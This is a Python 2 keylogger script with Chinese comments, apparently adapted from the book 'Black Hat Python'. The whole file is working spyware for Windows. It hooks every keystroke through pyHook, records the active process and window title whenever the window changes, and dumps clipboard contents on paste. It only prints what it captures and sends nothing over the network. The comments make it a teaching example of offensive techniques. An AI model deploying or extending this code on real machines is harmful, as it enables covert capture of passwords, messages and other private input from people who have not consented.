# !/usr/bin/env python
# -*- coding: utf-8 -*-
'''键盘记录器-python2
来源：python黑帽 '''

from ctypes import* #与c交互
import pythoncom
import pyHook #钩子
import win32clipboard #剪切板

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None

def get_current_process():

    #获得前台窗口(当前活动窗口)句柄
    hwnd = user32.GetForegroundWindow()

    #传入窗口句柄，获取窗口进程ID
    pid = c_ulong(0) #c中unsigned long型的变量
    user32.GetWindowThreadProcessId(hwnd, byref(pid))

    process_id = "%d" % pid.value #保存当前的进程ID

    executable = create_string_buffer("\x00" * 512) #ctypes模块的 #申请内存
    #打开窗口进程，返回进程句柄
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
    
    #传入进程句柄，获取进程对应的可执行文件的名字
    #byref(obj, offset)返回一个light-weight pointer（指针） to obj
    psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)
    
    #读取窗口标题
    window_title = create_string_buffer("\x00" * 512)
    length = user32.GetWindowTextA(hwnd,byref(window_title),512)

    #输出进程相关的信息
    print
    print"[PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value)
    print

    #关闭句柄
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)

#event是键盘事件
def KeyStroke(event):
    global current_window

    #检查目标是否切换了窗口
    if event.WindowName != current_window:
        current_window = event.WindowName
        get_current_process()

    #检测按键是否为常规按键（非组合键等）
    if event.Ascii > 32 and event.Ascii < 127:
        print chr(event.Ascii),
    else:
        #如果是Ctrl-v,则获得剪切板内容
        if event.Key == "V":
            win32clipboard.OpenClipboard()#打开
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()#关闭
            print "[PASTE] - %s" % pasted_value,
        else:
            print '[%s]' % event.Key,
            
    return True #返回，直到下一个钩子事件被触发


#创建和注册钩子函数管理器
k1 = pyHook.HookManager()
k1.KeyDown = KeyStroke #回调函数KeyStroke与KeyDown事件绑定

k1.HookKeyboard() #注册键盘记录的钩子，通过pyHook钩住了所有按键事件
pythoncom.PumpMessages()#永久循环
